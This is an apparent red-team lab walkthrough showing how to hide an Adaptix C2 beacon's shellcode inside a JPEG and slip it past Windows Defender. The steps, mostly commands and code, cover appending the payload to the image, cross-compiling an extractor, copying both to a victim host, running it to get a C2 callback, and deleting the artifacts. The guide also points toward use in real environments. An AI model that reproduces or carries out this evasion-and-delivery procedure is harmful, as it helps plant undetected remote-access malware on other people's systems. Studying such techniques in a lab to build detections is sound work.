# **10 Bypassing Windows Defender with hide-payload-in-image**

This guide demonstrates how to use steganographic techniques to hide Adaptix C2 payloads (Or any C2 Payload) inside image files, bypassing Windows Defender detection to maintain persistence on target systems in the GOAD-NHA environment.

> [!WARNING]  
> **OPSEC ALERT: Steganographic Payload Hiding**
> 
> Hiding payloads in image files can bypass signature-based AV, but advanced EDR and SIEM solutions may still detect behavioral anomalies, file size changes, or unusual process execution. Always test in a controlled lab before using in real environments.

---

# **Key Takeaways**

**Steganographic Evasion**

- Payload is hidden in the least significant bits of an image file.
    
- File appears as a normal image, evading basic detection.
    
- Extraction and execution are separated, reducing immediate risk.
    

---

# **Step-by-Step Guide: Bypassing Windows Defender with Image Steganography**

## **1. Prepare hide-payload-in-images Tool**

1. **Clone the repository on Kali**
 
```bash
cd /home/kali/Desktop/payloads
git clone https://github.com/WafflesExploits/hide-payload-in-images.git
cd hide-payload-in-images
```
 
2. **Place your image**
```bash
# Ensure your image is in the payloads directory
cp /path/to/your/aiforall.jpeg /home/kali/Desktop/payloads/aiforall.jpeg
```
3. **Check the original image size**
```bash
ls -l aiforall.jpeg
```

| 📝 **INFO** | Note the file size in bytes—you'll need this value for the extractor configuration (e.g., if `ls -l` shows `6594`, use that number in your code). |
|-------------|------------------------------------------------------------------------------------------------------------------------------------------------|


---

## **2. Generate Payload with Adaptix C2**

1. **Open AdaptixClient** and select your HTTP listener.
    
2. **Generate a new agent:**
    
    - Right-click listener → Generate Agent
        
    - Agent Type: Beacon
        
    - Platform: Windows x64
        
    - Format: shellcode
        
    - Save as `/home/kali/Desktop/payloads/payload.bin`
        

---

## **3. Append Payload to Image**

1. **Navigate to payloads directory**

```bash
cd /home/kali/Desktop/payloads
```

2. **Append the payload**

```bash
cat payload.bin >> aiforall.jpeg
```

3. **Verify new image size**

```bash
ls -l aiforall.jpeg
```

---

## **4. Compile the Payload Extractor**

1. **Navigate to extractor source**

```bash
cd /home/kali/Desktop/payloads/hide-payload-in-images/code/payload-extractor
```

2. **Edit extractor config**
- Open `payload-extractor-from-file.cpp` and update:

```cpp
#define TARGET_FILE_PATH "aiforall.jpeg"
#define ORIGINAL_FILE_SIZE 6594 // Replace with your image's original size
```
        
3. **Compile the extractor**

```bash
x86_64-w64-mingw32-g++ payload-extractor-from-file.cpp -o extracttool.exe
```


---

## **5. Transfer Files from Windows VM to Target**

> **Note:** In this workflow, you use SCP from the Windows VM to the victim, not from Kali.

1. **Copy `aiforall.jpeg` and `extracttool.exe` to the Windows VM** (if not already present).
    
2. **From the Windows VM, use SCP to transfer files to the victim:**

```powershell
scp kali@10.3.99.2:/home/kali/Desktop/payloads/extracttool.exe C:\ludus
scp kali@10.3.99.2:/home/kali/Desktop/payloads/aiforall.jpeg C:\ludus
```
 - Adjust paths and credentials as needed for your environment.
---

## **6. Execute Payload Extraction and Callback**

1. **On the victim machine, navigate to the transfer directory:**

```powershell
cd C:\temp
```
    
2. **Run the extractor:**

```powershell
extracttool.exe
```
3. **Monitor AdaptixClient for a new callback session.**

---

## **7. Validation and Cleanup**

1. **Confirm access via Adaptix C2.**
    
2. **Clean up artifacts:**

```powershell
del C:\temp\extracttool.exe
```
    
3. **Monitor Elastic SIEM for detection events. Maybe add detection rules?**
    

---

# **Tools Used**

- **Adaptix C2:** Payload generation and C2 management
    
- **hide-payload-in-images:** Steganographic payload hiding
    
- **MinGW-w64:** Cross-compiling extractor for Windows
    
- **SCP:** Secure file transfer from Windows VM to target
    
- **cat:** Appending payload to image
    

---

**Summary:**  
This workflow demonstrates how to use steganography and cross-compiled payload extractors to evade Windows Defender and deliver Adaptix C2 agents, with all file transfers initiated from the Windows VM. This method minimizes detection risk during transfer and leverages image files for covert payload delivery. Always validate and tune your workflow in a blue-teamed lab before real-world use.

Subscribe for more no-bs content: [IT Security Labs YouTube](https://www.youtube.com/@ITSecurityLabs)